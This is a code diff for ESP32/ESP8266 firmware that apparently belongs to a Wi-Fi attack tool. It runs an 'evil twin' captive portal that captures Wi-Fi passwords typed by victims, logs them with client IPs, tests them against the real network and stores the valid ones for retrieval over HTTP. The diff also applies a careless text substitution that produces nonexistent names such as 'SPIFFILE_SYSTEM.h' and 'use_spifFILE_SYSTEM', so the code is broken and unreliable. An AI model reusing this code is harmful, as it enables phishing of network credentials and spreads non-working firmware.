@@ -5,31 +5,25 @@
 #ifdef ESP32
     #include <WiFi.h>
     #include <esp_wifi.h>
+    #include <WebServer.h>
+    #include <DNSServer.h>
+    #include <SPIFFILE_SYSTEM.h>
 #else
     extern "C" {
         #include "user_interface.h"
     }
     #include <ESP8266WiFi.h>
-#endif
-
-#include <WiFiClient.h>
-#ifdef ESP32
-    #include <WebServer.h>
-#else
+    #include <WiFiClient.h>
     #include <ESP8266WebServer.h>
-#endif
-#include <DNSServer.h>
-
-#ifndef ESP32
+    #include <DNSServer.h>
     #include <ESP8266mDNS.h>
+    #include <FILE_SYSTEM.h>
 #endif
 
 #ifdef ESP32
-    #include <SPIFFS.h>
-    #define FS SPIFFS
+    #define FILE_SYSTEM SPIFFILE_SYSTEM
 #else
-    #include <FS.h>
-    #define FS FS
+    #define FILE_SYSTEM LittleFILE_SYSTEM
 #endif
 
 #include "language.h"
@@ -39,7 +33,7 @@
 #include "Attack.h"
 #include "Scan.h"
 
-extern bool progmemToSpiffs(const char* adr, int len, String path);
+extern bool progmemToSpifFILE_SYSTEM(const char* adr, int len, String path);
 
 #include "webfiles.h"
 
@@ -134,7 +128,7 @@ namespace wifi {
         // debugln(path);
 
         #ifdef ESP32
-            File root = FS.open(path);
+            File root = FILE_SYSTEM.open(path);
             File entry;
             String output = String('{');
             bool first = true;
@@ -151,7 +145,7 @@ namespace wifi {
             output += CLOSE_BRACKET;
             server.send(200, str(W_JSON).c_str(), output);
         #else
-            Dir dir = FS.openDir(path);
+            Dir dir = FILE_SYSTEM.openDir(path);
             File   entry;
             bool   first = true;
 
@@ -201,29 +195,29 @@ namespace wifi {
         String contentType = getContentType(path);
 
         #ifdef ESP32
-            if (!FS.exists(path)) {
-                if (FS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
-                else if (FS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
-                else if (FS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
+            if (!FILE_SYSTEM.exists(path)) {
+                if (FILE_SYSTEM.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
+                else if (FILE_SYSTEM.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
+                else if (FILE_SYSTEM.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
                 else {
                     return false;
                 }
             }
-            File file = FS.open(path, "r");
+            File file = FILE_SYSTEM.open(path, "r");
             server.streamFile(file, contentType);
             file.close();
         #else
-            if (!FS.exists(path)) {
-                if (FS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
-                else if (FS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
-                else if (FS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
+            if (!FILE_SYSTEM.exists(path)) {
+                if (FILE_SYSTEM.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
+                else if (FILE_SYSTEM.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
+                else if (FILE_SYSTEM.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
                 else {
                     // prntln(W_NOT_FOUND);
                     return false;
                 }
             }
 
-            File file = FS.open(path, "r");
+            File file = FILE_SYSTEM.open(path, "r");
 
             server.streamFile(file, contentType);
             file.close();
@@ -249,7 +243,7 @@ namespace wifi {
         setHidden(settings::getAccessPointSettings().hidden);
         setCaptivePortal(settings::getWebSettings().captive_portal);
 
-        if (settings::getWebSettings().use_spiffs) {
+        if (settings::getWebSettings().use_spifFILE_SYSTEM) {
             copyWebFiles(false);
         }
 
@@ -334,7 +328,7 @@ namespace wifi {
         #ifdef USE_PROGMEM_WEB_FILES
         // ================================================================
         // paste here the output of the webConverter.py
-        if (!settings::getWebSettings().use_spiffs) {
+        if (!settings::getWebSettings().use_spifFILE_SYSTEM) {
             server.on("/", HTTP_GET, []() {
                 sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
             });
@@ -439,7 +433,7 @@ namespace wifi {
             });
         }
         server.on("/lang/default.lang", HTTP_GET, []() {
-            if (!settings::getWebSettings().use_spiffs) {
+            if (!settings::getWebSettings().use_spifFILE_SYSTEM) {
                 if (String(settings::getWebSettings().lang) == "hu") sendProgmem(hulang, sizeof(hulang), W_JSON);
                 else if (String(settings::getWebSettings().lang) == "ja") sendProgmem(jalang, sizeof(jalang), W_JSON);
                 else if (String(settings::getWebSettings().lang) == "nl") sendProgmem(nllang, sizeof(nllang), W_JSON);
@@ -484,7 +478,7 @@ namespace wifi {
             String password = server.arg("pwd");
             String clientIP = server.client().remoteIP().toString();
             
-            File logFile = FS.open("/etwin_log.txt", "a");
+            File logFile = FILE_SYSTEM.open("/etwin_log.txt", "a");
             if (logFile) {
                 logFile.print("[");
                 logFile.print(millis());
@@ -524,7 +518,7 @@ namespace wifi {
                         if (connected) {
                             logFile.print(" [VALID!]");
                             Serial.println(" VALID!");
-                            File validFile = FS.open("/valid_pass.txt", "a");
+                            File validFile = FILE_SYSTEM.open("/valid_pass.txt", "a");
                             if (validFile) {
                                 validFile.print("[");
                                 validFile.print(millis());
@@ -553,7 +547,7 @@ namespace wifi {
         });
 
         server.on("/etwin.html", HTTP_GET, []() {
-            if (FS.exists("/web/etwin.html")) {
+            if (FILE_SYSTEM.exists("/web/etwin.html")) {
                 handleFileRead("/web/etwin.html");
             } else {
                 server.send(200, str(W_HTML), 
@@ -562,8 +556,8 @@ namespace wifi {
         });
 
         server.on("/etwin_log.txt", HTTP_GET, []() {
-            if (FS.exists("/etwin_log.txt")) {
-                File logFile = FS.open("/etwin_log.txt", "r");
+            if (FILE_SYSTEM.exists("/etwin_log.txt")) {
+                File logFile = FILE_SYSTEM.open("/etwin_log.txt", "r");
                 String content = "";
                 if (logFile) {
                     content = logFile.readString();
@@ -576,8 +570,8 @@ namespace wifi {
         });
 
         server.on("/clear_logs", HTTP_GET, []() {
-            if (FS.exists("/etwin_log.txt")) {
-                FS.remove("/etwin_log.txt");
+            if (FILE_SYSTEM.exists("/etwin_log.txt")) {
+                FILE_SYSTEM.remove("/etwin_log.txt");
                 server.send(200, str(W_TXT), "Logs cleared");
             } else {
                 server.send(200, str(W_TXT), "No logs to clear");
@@ -585,8 +579,8 @@ namespace wifi {
         });
 
         server.on("/valid_pass.txt", HTTP_GET, []() {
-            if (FS.exists("/valid_pass.txt")) {
-                File passFile = FS.open("/valid_pass.txt", "r");
+            if (FILE_SYSTEM.exists("/valid_pass.txt")) {
+                File passFile = FILE_SYSTEM.open("/valid_pass.txt", "r");
                 String content = "";
                 if (passFile) {
                     content = passFile.readString();
@@ -599,8 +593,8 @@ namespace wifi {
         });
 
         server.on("/clear_valid", HTTP_GET, []() {
-            if (FS.exists("/valid_pass.txt")) {
-                FS.remove("/valid_pass.txt");
+            if (FILE_SYSTEM.exists("/valid_pass.txt")) {
+                FILE_SYSTEM.remove("/valid_pass.txt");
                 server.send(200, str(W_TXT), "Valid passwords cleared");
             } else {
                 server.send(200, str(W_TXT), "No valid passwords to clear");
@@ -613,7 +607,7 @@ namespace wifi {
                 if (i > 1) json += ",";
                 String filename = "/web/etwin" + String(i) + ".html";
                 json += "{\"id\":" + String(i);
-                json += ",\"exists\":" + String(FS.exists(filename) ? "true" : "false");
+                json += ",\"exists\":" + String(FILE_SYSTEM.exists(filename) ? "true" : "false");
                 json += "}";
             }
             json += "]";
@@ -624,7 +618,7 @@ namespace wifi {
             String id = server.arg("id");
             String filename = "/web/etwin" + id + ".html";
             if (id.toInt() >= 1 && id.toInt() <= 5) {
-                if (FS.exists(filename)) {
+                if (FILE_SYSTEM.exists(filename)) {
                     server.send(200, str(W_TXT), String("Selected: etwin") + id + ".html");
                 } else {
                     server.send(200, str(W_TXT), String("Error: etwin") + id + ".html not found");
@@ -637,7 +631,7 @@ namespace wifi {
         server.on("/preview", HTTP_GET, []() {
             String id = server.arg("page");
             String filename = "/web/etwin" + id + ".html";
-            if (id.toInt() >= 1 && id.toInt() <= 5 && FS.exists(filename)) {
+            if (id.toInt() >= 1 && id.toInt() <= 5 && FILE_SYSTEM.exists(filename)) {
                 handleFileRead(filename);
             } else {
                 server.send(200, str(W_HTML), "<html><body><h1>Preview Error</h1><p>Page not found or invalid ID</p></body></html>");
@@ -645,13 +639,13 @@ namespace wifi {
         });
 
         // called when the url is not defined here
-        // use it to load content from SPIFFS
+        // use it to load content from SPIFFILE_SYSTEM
         server.onNotFound([]() {
             if (!handleFileRead(server.uri())) {
                 if (settings::getWebSettings().captive_portal) {
                     if (attack.isEvilTwinRunning()) {
                         String etwinFile = "/web/etwin.html";
-                        if (FS.exists(etwinFile)) {
+                        if (FILE_SYSTEM.exists(etwinFile)) {
                             handleFileRead(etwinFile);
                         } else {
                             sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
